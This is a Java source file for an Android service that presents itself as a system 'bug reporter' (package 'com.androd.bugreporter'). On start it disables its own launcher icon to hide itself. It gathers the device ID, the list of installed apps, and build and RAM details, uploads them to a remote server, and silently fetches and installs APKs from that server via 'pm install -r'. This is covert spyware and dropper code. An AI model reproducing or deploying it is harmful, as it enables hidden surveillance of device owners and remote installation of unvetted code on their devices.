package com.androd.bugreporter.system;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.json.JSONObject;

import android.app.Service;
import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.os.Environment;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.Settings.Secure;
import android.text.TextUtils;
import android.util.Log;

import com.androd.bugreporter.MainActivity;
import com.androd.bugreporter.MyApplication;
import com.androd.bugreporter.utils.ExecTools;
import com.androd.bugreporter.utils.HttpServer;
import com.androd.bugreporter.utils.IshareContentData.DeviceData;
import com.androd.bugreporter.utils.IshareContentData.PackageInfoData;
import com.androd.bugreporter.utils.IshareContentData.PropInfoData;
import com.google.gson.Gson;

public class FixService extends Service {

	Ana ana = null;
	Context ctx = null;
	boolean need_up_pm = false;//是否需要上传安装详情，计划一天一次
	long ONEDAY = 24 * 60 * 60;

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		Log.i(MyApplication.TAG, "onCreate");
		super.onCreate();
		ctx = this;
	}

	@Override
	public void onDestroy() {
		Log.i(MyApplication.TAG, "onDestroy");
		super.onDestroy();
	}

	@Override
	public void onStart(Intent intent, int startId) {
		Log.i(MyApplication.TAG, "onStart");
		
		PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        int res = packageManager.getComponentEnabledSetting(componentName);
        if (res == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
                || res == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
            // 隐藏应用图标
    		Log.i(MyApplication.TAG, "disable icon");
            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        }
        
		// super.onStart(intent, startId);
		if (ana == null || !ana.isAlive()) {

			ana = new Ana();
			// ana.setDaemon(true);
			ana.run();
		}

	}

	/**
	 * PackageManager介绍： 本类API是对所有基于加载信息的数据结构的封装，包括以下功能： 安装，卸载应用
	 * 查询permission相关信息 查询Application相关
	 * 信息(application，activity，receiver，service，provider及相应属性等） 查询已安装应用
	 * 增加，删除permission 清除用户数据、缓存，代码段等 非查询相关的API需要特定的权限。 主要包含了，安装在当前设备上的应用包的相关信息
	 * 如下：获取已经安装的应用程序的信息
	 */
	private HashMap<String, String> getPackagesInfo() {
		// 获取packageManager对象
		PackageManager packageManager = this.getPackageManager();
		/*
		 * getInstalledApplications 返回当前设备上安装的应用包集合
		 * ApplicationInfo对应着androidManifest
		 * .xml中的application标签。通过它可以获取该application对应的信息
		 */
		List<ApplicationInfo> applicationInfos = packageManager
				.getInstalledApplications(0);
		HashMap<String, String> resultMap = new HashMap<String, String>();
		Iterator<ApplicationInfo> iterator = applicationInfos.iterator();
		while (iterator.hasNext()) {
			ApplicationInfo applicationInfo = iterator.next();
			String packageName = applicationInfo.packageName;// 包名
			String packageLabel = packageManager.getApplicationLabel(
					applicationInfo).toString();// 获取label
			resultMap.put(packageLabel, packageName);
		}

		return resultMap;

	}

	private void runStep_Pm() {
		HashMap<String, String> mp = new HashMap<String, String>();

		SharedPreferences mPerferences = PreferenceManager
				.getDefaultSharedPreferences(this);

		int counter = mPerferences.getInt("counter", 0);

		SharedPreferences.Editor mEditor = mPerferences.edit();
		int cr_time = (int) Calendar.getInstance().getTime().getTime() / 1000;

		Log.e(MyApplication.TAG, "runStep_Pm in  counter:" + counter
				+ ",cr_time:" + cr_time);
		if (cr_time - counter >= ONEDAY || counter == 0) {

			mEditor.putInt("counter", cr_time);
			mEditor.commit();

			ctx.getContentResolver().delete(PackageInfoData.CONTENT_URI, null,
					null);

			// let it go

			mp = getPackagesInfo();

			for (String key : mp.keySet()) {
				Log.i(MyApplication.TAG, "package name:" + key);
				String packagename = mp.get(key);
				PackageInfo pi;
				String versionname = "";
				String versioncode = "";

				PackageManager packageManager = ctx.getPackageManager();
				try {
					pi = packageManager.getPackageInfo(packagename, 0);
					versionname = pi.versionName;
					versioncode = String.valueOf(pi.versionCode);

					ContentValues cv = new ContentValues();
					cv.put(PackageInfoData.LABEL, key);
					cv.put(PackageInfoData.NAME, packagename);
					cv.put(PackageInfoData.VERISON, versionname);
					cv.put(PackageInfoData.CODE, versioncode);
					ctx.getContentResolver().insert(
							PackageInfoData.CONTENT_URI, cv);
				} catch (NameNotFoundException e) {
					e.printStackTrace();
				}

			}
			need_up_pm = true;
		}

	}

	public boolean isTextValid(String str) {
		if (str == null || TextUtils.isEmpty(str)) {
			return false;
		}
		return true;
	}

	private void runStep_Device() {

		MyApplication ap = (MyApplication) getApplication();

		Log.e(MyApplication.TAG,
				"runStep_Device in  . .============....deviceinfo......");

		if (!isTextValid(ap.getUser().deviceid)
				|| !isTextValid(ap.getUser().version)) {

			String android_id = Secure.getString(getContentResolver(),
					Secure.ANDROID_ID);

			PackageManager packageManager = ctx.getPackageManager();

			PackageInfo pi;
			String version = "";
			try {
				pi = packageManager.getPackageInfo("com.androd.bugreporter",
						PackageManager.GET_ACTIVITIES);

				Log.i(MyApplication.TAG, "1 " + pi.toString());

				pi = packageManager.getPackageInfo("com.androd.bugreporter", 0);

				Log.i(MyApplication.TAG, "2 " + pi.toString());

				version = pi.versionName;
			} catch (NameNotFoundException e) {
				e.printStackTrace();
			}

			ctx.getContentResolver().delete(DeviceData.CONTENT_URI, null, null);
			if (!isTextValid(android_id)) {
				android_id = "lingshi"
						+ Calendar.getInstance().getTime().getTime();
			}
			ContentValues cv = new ContentValues();
			cv.put(DeviceData.DEVICEID, android_id);
			cv.put(DeviceData.VERSION, version);

			ap.getUser().deviceid = android_id;
			ap.getUser().version = version;

			ctx.getContentResolver().insert(DeviceData.CONTENT_URI, cv);

		}
	}

	// [ro.build.display.id]: [Q2S-Andriod-4.42-Baba-20141210]
	//
	// [ro.build.fingerprint]:
	// [softwinners/mars_a31s/mars-a31s:4.4.2/KOT49H/20140624:eng/test-keys]
	//
	// [ro.build.product]: [mars-a31s]
	//
	// [ro.build.type]: [eng]
	//
	// [ro.build.version.release]: [4.4.2]
	//
	// [ro.build.version.sdk]: [19]
	//
	// [ro.product.model]: [Himedia_Q2S]

	private void runStep_Prop() {
		Cursor cursor = getContentResolver().query(PropInfoData.CONTENT_URI,
				null, null, null, null);
		if (!(null != cursor && cursor.getCount() > 0)) {
			String model = getPropInfo(new String[] { "sh", "-c",
					"getprop|grep ro.product.model" });// ro.yunos.product.board

			String hwVersion = getPropInfo(new String[] { "sh", "-c",
					"getprop|grep ro.build.version.release" });

			String displayid = getPropInfo(new String[] { "sh", "-c",
					"getprop|grep ro.build.display.id" });

			String fingerprint = getPropInfo(new String[] { "sh", "-c",
					"getprop|grep ro.build.fingerprint" });

			String product = getPropInfo(new String[] { "sh", "-c",
					"getprop|grep ro.build.product" });

			String type = getPropInfo(new String[] { "sh", "-c",
					"getprop|grep ro.build.type" });

			String sdk = getPropInfo(new String[] { "sh", "-c",
					"getprop|grep ro.build.version.sdk" });

			String ramInfo = getRamInfo(new String[] { "sh", "-c",
					"busybox free" });

			ContentValues cv = new ContentValues();
			cv.put(PropInfoData.BUILDID, displayid);
			cv.put(PropInfoData.FINGERPRINT, fingerprint);
			cv.put(PropInfoData.PRODUCT, product);
			cv.put(PropInfoData.TYPE, type);
			cv.put(PropInfoData.REL, hwVersion);
			cv.put(PropInfoData.SDK, sdk);
			cv.put(PropInfoData.RAM, ramInfo);
			cv.put(PropInfoData.MODEL, model);

			ctx.getContentResolver().insert(PropInfoData.CONTENT_URI, cv);
		}

		if (cursor != null) {
			cursor.close();
			cursor = null;
		}
	}

	private void fixPackage(String[] commands) {

		try {
			// new String[]{"sh","-c","pm install /mnt/sdcard/tmp.apk"}
			ExecTools.execCommandArray(commands);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private String getRamInfo(String[] commands) {
		String ram = "";
		try {
			String resultstr = ExecTools.execCommandArray(commands);
			if (resultstr.split("Mem:").length <= 1) {

				Log.i(MyApplication.TAG, "start run ana thread!");
				return "unkown";
			}
			resultstr = resultstr.split("Mem:")[1].trim();
			resultstr = resultstr.substring(0, resultstr.indexOf(" "));

			if (Integer.valueOf(resultstr) < 500000) {
				resultstr = "512M";
			} else if (Integer.valueOf(resultstr) >= 500000
					&& Integer.valueOf(resultstr) < 900000) {//modify for 1g
				resultstr = "1G";
			} else {
				resultstr = "2G";
			}
			ram = resultstr.trim();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return ram;
	}

	private String getPropInfo(String[] commands) {
		String propinfo_x = "";
		try {
			String propinfo = ExecTools.execCommandArray(commands);
			if (propinfo.split(":").length >= 2) {
				propinfo = propinfo.split(":")[1].trim();
				propinfo = propinfo.replace("[", "");
				propinfo = propinfo.replace("]", "");
				propinfo_x = propinfo.trim();
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		return propinfo_x;
	}

	public static InputStream fetchFile(String version) {
		HttpServer mService = new HttpServer();
		StringBuffer urlSuffix = new StringBuffer("BugreportServer/Bugreporter"
				+ version + ".apk");

		try {
			HttpResponse mResponse = mService.sendHttpClient(false,
					urlSuffix.toString(), null);
			int code = mResponse.getStatusLine().getStatusCode();
			if (code == HttpStatus.SC_OK) {
				return mResponse.getEntity().getContent();
			}

		} catch (Exception e) {
			e.printStackTrace();
			Log.i(MyApplication.TAG, "fetch服务器无法连接！");
		}
		return null;
	}

	class netCheck extends Thread {
		


		private void checkInstallOthersUpdatePackage() {
			String filename = "tmp.apk";

			fixPackage(new String[] {
					"sh",
					"-c",
					"pm install -r "
							+ Environment.getExternalStorageDirectory()
							+ filename });
		}

		private void checkSelfUpdatePackage() {
			String filename = "tmp.apk";
			boolean needfix = false;
			String newVerison = "";

			PackageManager packageManager = ctx.getPackageManager();
			String version = "";
			try {
				PackageInfo pi = packageManager
						.getPackageInfo("com.androd.bugreporter",
								PackageManager.GET_ACTIVITIES);

				Log.i(MyApplication.TAG, "3 " + pi.toString());

				pi = packageManager.getPackageInfo("com.androd.bugreporter", 0);

				Log.i(MyApplication.TAG, "4 " + pi.toString());

				version = pi.versionName;

			} catch (NameNotFoundException e) {
				e.printStackTrace();
			}

			HttpServer mService = new HttpServer();
			StringBuffer urlSuffix = new StringBuffer(
					"BugreportServer/fix/checkself?version=");
			urlSuffix.append(version);

			// JSONArray jsonarray =
			// JSONArray.fromObject(taglist.toArray());
			Gson gson = new Gson();

			try {
				HttpResponse mResponse = mService.sendHttpClient(false,
						urlSuffix.toString(), null);
				int code = mResponse.getStatusLine().getStatusCode();
				if (code == HttpStatus.SC_OK) {
					String response = HttpServer.getResponse(mResponse);
					JSONObject jsonObject = new JSONObject(response);
					boolean result = jsonObject.getBoolean("result");
					Log.i(MyApplication.TAG, "上传服务器返回结果：" + result);
					// System.err.println("上传服务器返回结果：" + result);
					needfix = jsonObject.getBoolean("isUpdate");
					newVerison = jsonObject.getString("newversion");

				} else {
					Log.i(MyApplication.TAG, "服务器错误！");
					// sendMessage("服务器错误", SERVER_ERROR);
				}

			} catch (Exception e) {
				e.printStackTrace();
				Log.i(MyApplication.TAG, "服务器无法连接！");
				// sendMessage("服务器无法连接", INTERNET_ERROR);
			}

			if (needfix && isTextValid(newVerison)) {

				InputStream in = fetchFile(newVerison);
				if (in == null) {
					Log.i(MyApplication.TAG, "err input  is null!");
					return;
				}

				File file = new File(Environment.getExternalStorageDirectory(),
						filename);
				file.deleteOnExit();

				try {
					FileOutputStream fs = new FileOutputStream(file);
					byte buffer[] = new byte[1024];// 注意这个地方要实报实销，由于是网络传输，每次取到的字节流是不一样的额，要做做坏打算
					while (true) {
						int count = in.read(buffer, 0, 1024);
						if (count == -1) {
							break;
						}
						fs.write(buffer, 0, count);
					}
					Log.e(MyApplication.TAG, "writing. .==========... end..");

					in.close();
					in = null;
					fs.flush();
					fs.close();
				} catch (FileNotFoundException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

				// delete database & application version to invoke rewiter
				// must be before pm isntall,or the activitymanager will kill
				// process after pm install self,the code below pm install will
				// not reachable
				Log.e(MyApplication.TAG,
						"restart . .============....deviceinfo......");
				ctx.getContentResolver().delete(DeviceData.CONTENT_URI, null,
						null);
				MyApplication ap = (MyApplication) getApplication();
				ap.setUser(new DeviceData());

				// runStep_Device();//invoke

				fixPackage(new String[] {
						"sh",
						"-c",
						"pm install -r "
								+ Environment.getExternalStorageDirectory()
								+ "/" + filename });

				// update database & application version
				/*
				 * ContentValues cv = new ContentValues();
				 * cv.put(DeviceData.VERSION, version);
				 */
				/*
				 * ctx.getContentResolver().update(DeviceData.CONTENT_URI, cv,
				 * "self_version = ?", new String[]{version}); MyApplication ap
				 * = (MyApplication) getApplication(); ap.getUser().version =
				 * version;
				 */

			} else {

				Log.i(MyApplication.TAG, "err needfix:" + needfix
						+ "newVerison:" + newVerison);
			}
		}


		public class PackageEntity {

			public String deviceid = "";

			public String sessionid = "";

			public String version = "";

			public String buildid = "";

			public String fingerprint = "";

			public String product = "";

			public String type = "";

			public String releaseversion = "";

			public String sdkveriosn = "";

			public String ram = "";

			public String packagename = "";

			public String packageversion = "";

			public String packagecode = "";

			public String packagelabel = "";

			public PackageEntity(PackageInfoData pmdate) {

				packagename = pmdate.packagename;

				packageversion = pmdate.packageversion;

				packagecode = pmdate.packagecode;

				packagelabel = pmdate.packagelabel;
			}

			public PackageEntity(PropInfoData propdata, DeviceData dd) {

				deviceid = dd.deviceid;

				version = dd.version;

				buildid = propdata.buildid;

				fingerprint = propdata.fingerprint;

				product = propdata.product;

				type = propdata.type;

				releaseversion = propdata.releaseversion;

				sdkveriosn = propdata.sdkveriosn;

				ram = propdata.ram;

			}
		}

		private void collectSend() {

			ArrayList<PackageEntity> pmlist = new ArrayList<PackageEntity>();

			Log.i(MyApplication.TAG, "collectSend in");
			
			MyApplication ap = (MyApplication) getApplication();

			Cursor cr = ctx.getContentResolver().query(
					PropInfoData.CONTENT_URI, null, null, null, null);
			
			if (cr == null || cr.getCount() != 0) {
                PropInfoData pd = new PropInfoData();
				cr.moveToFirst();
				pd.restore(cr);
				pmlist.add(new PackageEntity(pd, ap.getUser()));
				cr.close();
				cr = null;
			}
			
			if(need_up_pm){
				need_up_pm = false;
				cr = ctx.getContentResolver().query(
						PackageInfoData.CONTENT_URI, null, null, null, null);
				
				if (cr == null || cr.getCount() != 0) {

					while (cr.moveToNext()) {
						PackageInfoData tag = new PackageInfoData();
						tag.restore(cr);
						pmlist.add(new PackageEntity(tag));
					}
				}
			}

			HttpServer mService = new HttpServer();
			StringBuffer urlSuffix = new StringBuffer(
					"BugreportServer/fix/upPm?deviceid=");
			urlSuffix.append(ap.getUser().deviceid);

			Gson gson = new Gson();
			try {
				HttpResponse mResponse = mService.sendHttpClient(false,
						urlSuffix.toString(), gson.toJson(pmlist));
				int code = mResponse.getStatusLine().getStatusCode();
				if (code == HttpStatus.SC_OK) {
					String response = HttpServer.getResponse(mResponse);
					JSONObject jsonObject = new JSONObject(response);
					String result = jsonObject.getString("successful");
					System.err.println("net result：" + result);

				} else {
					System.err.println("net error！");
				}

			} catch (Exception e) {
				e.printStackTrace();
				System.err.println("net error！");
			}

			Log.i(MyApplication.TAG, "collectSend out");
		}
		
		@Override
		public void run() {
			Log.i(MyApplication.TAG, "netcheck in");
			

			collectSend();
			
			checkSelfUpdatePackage();
			Log.i(MyApplication.TAG, "netcheck out");
		}

	}

	class Ana extends Thread {

		@Override
		public void run() {
			// TODO Auto-generated method stub
			// super.run();
			Log.i(MyApplication.TAG, "start run ana thread!");

			runStep_Device();// 获取设备信息
			runStep_Pm();
			runStep_Prop();

			// checkSelfUpdatePackage();//自荐更新


			new netCheck().start();// new thread

			try {
				Thread.sleep(3000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}

			Log.i(MyApplication.TAG, "exit ana thread!");

		}

		/*
		 * collect info to server
		 */



	}

}
